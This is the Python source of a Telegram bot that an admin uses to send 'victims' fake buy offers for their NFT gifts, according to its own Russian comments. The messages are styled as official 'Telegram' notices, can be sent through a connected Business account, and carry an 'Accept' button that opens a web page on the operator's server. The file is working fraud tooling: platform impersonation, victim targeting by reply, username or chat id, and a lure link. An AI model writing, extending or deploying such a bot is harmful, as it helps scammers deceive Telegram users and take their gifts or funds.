# language: Python 3.12, file: bot.py
# Telegram Business bot: слушает команду "купить <ссылка> <цена>"
# от админа, отправляет жертве фейковый оффер-карточку через Business API.
import os, re, asyncio, logging
from aiogram import Bot, Dispatcher, F, Router
from aiogram.client.default import DefaultBotProperties
from aiogram.enums import ParseMode, ChatType
from aiogram.filters import Command
from aiogram.types import (Message, CallbackQuery, InlineKeyboardButton,
                           InlineKeyboardMarkup, WebAppInfo, BusinessConnection)
from dotenv import load_dotenv

from app import make_offer, get_offer, BASE

load_dotenv()
logging.basicConfig(level=logging.INFO)
log = logging.getLogger("offerbot")

BOT_TOKEN = os.getenv("BOT_TOKEN")
ADMIN_ID = int(os.getenv("ADMIN_ID", "0"))
BASE_URL = os.getenv("WEBAPP_BASE", "http://localhost:8080")

bot = Bot(BOT_TOKEN, default=DefaultBotProperties(parse_mode=ParseMode.HTML))
dp = Dispatcher()
router = Router()
dp.include_router(router)

# Хранилище business_connections: chat_id -> connection_id
BUSINESS_CONNS: dict[int, str] = {}


# ---------- парсер ссылки на NFT подарок ----------
# Поддерживаем форматы:
#   https://t.me/nft/JesterHat-19
#   https://t.me/nft/Jester-Hat-19
#   https://t.me/addstickers/... (не NFT)
#   https://t.me/<username>/<msgid>  (форвард сообщения с подарком)
NFT_RE = re.compile(r"https?://t\.me/nft/([A-Za-z0-9_-]+)")
PRICE_RE = re.compile(r"(\d+)\s*(gram|грам|звезд|star|stars|⭐)", re.I)

def parse_nft(url: str):
    m = NFT_RE.search(url)
    if not m:
        return None
    slug_raw = m.group(1)          # "JesterHat-19"
    # разбиваем slug: имя и номер
    parts = slug_raw.rsplit("-", 1)
    if len(parts) == 2 and parts[1].isdigit():
        name_raw, num = parts
    else:
        name_raw, num = slug_raw, ""
    # CamelCase → с пробелами: "JesterHat" → "Jester Hat"
    display = re.sub(r"(?<!^)(?=[A-Z])", " ", name_raw).strip()
    full = f"{display} #{num}" if num else display
    return {"slug": slug_raw, "name": full}


def parse_price(text: str):
    m = PRICE_RE.search(text)
    if not m:
        return None
    amount = m.group(1)
    unit = m.group(2).lower()
    if unit in ("gram", "грам"):
        return f"{amount} Gram"
    return f"{amount} Stars"


# ---------- команда от админа ----------
# Формат: купить https://t.me/nft/JesterHat-19 155 GRAM
# Или:    купить https://t.me/nft/JesterHat-19 1200 звёзд
# Reply-на-сообщение от жертвы опционально.
@router.message(Command("buy", "купить"))
async def cmd_buy(msg: Message):
    if msg.from_user.id != ADMIN_ID:
        return
    parts = msg.text.split(maxsplit=2)
    if len(parts) < 3:
        await msg.reply("Формат: <code>купить &lt;ссылка&gt; &lt;цена&gt;</code>\n"
                        "Пример: <code>купить https://t.me/nft/JesterHat-19 155 GRAM</code>")
        return
    url, price_raw = parts[1], parts[2]

    nft = parse_nft(url)
    if not nft:
        await msg.reply("❌ Не распознал ссылку. Нужен <code>https://t.me/nft/...</code>")
        return
    price = parse_price(price_raw)
    if not price:
        await msg.reply("❌ Цена не распознана. Пример: <code>155 GRAM</code> или "
                        "<code>1200 звёзд</code>")
        return

    # Кому отправляем? Либо reply-на-сообщение, либо следующий аргумент chat_id
    target_chat = None
    target_user = None
    if msg.reply_to_message:
        target_chat = msg.reply_to_message.chat.id
        target_user = (msg.reply_to_message.from_user.username
                       if msg.reply_to_message.from_user else None)
    elif len(parts) >= 4:
        # доп. аргумент @username или chat_id
        rest = parts[3] if len(parts) > 3 else ""
        m = re.search(r"@(\w+)", rest)
        if m:
            target_user = m.group(1)
        else:
            try:
                target_chat = int(rest)
            except ValueError:
                pass

    if not target_chat and not target_user:
        await msg.reply("❌ Укажи цель: reply на сообщение жертвы, "
                        "либо <code>@username</code>, либо <code>chat_id</code> в конце.")
        return

    # Регистрируем оффер
    oid = make_offer(
        nft_name=nft["name"], nft_slug=nft["slug"], price=price,
        buyer=msg.from_user.username or "you",
        target_user=target_user or "target",
        target_chat_id=target_chat or 0)

    text = (
        f"<b>Telegram</b>\n"
        f"<b>{nft['name']}</b>\n\n"
        f"Пользователь <b>{msg.from_user.username or 'buyer'}</b> "
        f"предлагает Вам <b>{price}</b> за подарок "
        f"<b>{nft['name']}</b>.\n\n"
        f"Предложение действует ещё <b>6ч 0м</b>."
    )
    kb = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="Отклонить",
                              callback_data=f"reject:{oid}"),
         InlineKeyboardButton(text="Принять",
                              web_app=WebAppInfo(url=f"{BASE_URL}/offer/{oid}"))]
    ])

    # Отправка через Business connection (от имени владельца бота)
    conn_id = BUSINESS_CONNS.get(msg.chat.id) or \
              next(iter(BUSINESS_CONNS.values()), None)
    try:
        if target_chat and conn_id:
            # через Business API
            await bot.send_message(
                chat_id=target_chat,
                text=text,
                reply_markup=kb,
                business_connection_id=conn_id)
        elif target_chat:
            await bot.send_message(chat_id=target_chat, text=text, reply_markup=kb)
        elif target_user:
            await bot.send_message(chat_id=f"@{target_user}",
                                   text=text, reply_markup=kb)
        await msg.reply(f"✅ Оффер {oid} отправлен. Ссылка для проверки:\n"
                        f"{BASE_URL}/offer/{oid}")
    except Exception as e:
        await msg.reply(f"❌ Ошибка отправки: <code>{e}</code>")


# ---------- приём Business connection ----------
@router.business_connection()
async def on_business_conn(conn: BusinessConnection):
    BUSINESS_CONNS[conn.user.id] = conn.id
    log.info(f"Business connection: user={conn.user.id} id={conn.id}")


# ---------- кнопка "Отклонить" ----------
@router.callback_query(F.data.startswith("reject:"))
async def on_reject(cb: CallbackQuery):
    oid = cb.data.split(":", 1)[1]
    o = get_offer(oid)
    if not o:
        await cb.answer("Оффер истёк")
        return
    try:
        await cb.message.edit_reply_markup(reply_markup=None)
    except Exception:
        pass
    await cb.answer("Отклонено")


# ---------- fallback для админа ----------
@router.message(F.chat.type == ChatType.PRIVATE, F.from_user.id == ADMIN_ID)
async def admin_help(msg: Message):
    if msg.text and msg.text.startswith("/start"):
        await msg.reply(
            "<b>Business Offer Bot</b>\n\n"
            "Команда:\n<code>купить &lt;ссылка&gt; &lt;цена&gt;</code>\n\n"
            "Пример:\n"
            "<code>купить https://t.me/nft/JesterHat-19 155 GRAM</code>\n"
            "<code>купить https://t.me/nft/JesterHat-19 1200 звёзд</code>\n\n"
            "Цель — reply на сообщение жертвы, либо @username/chat_id в конце.")


async def main():
    log.info("Starting bot...")
    await dp.start_polling(bot)


if __name__ == "__main__":
    asyncio.run(main())
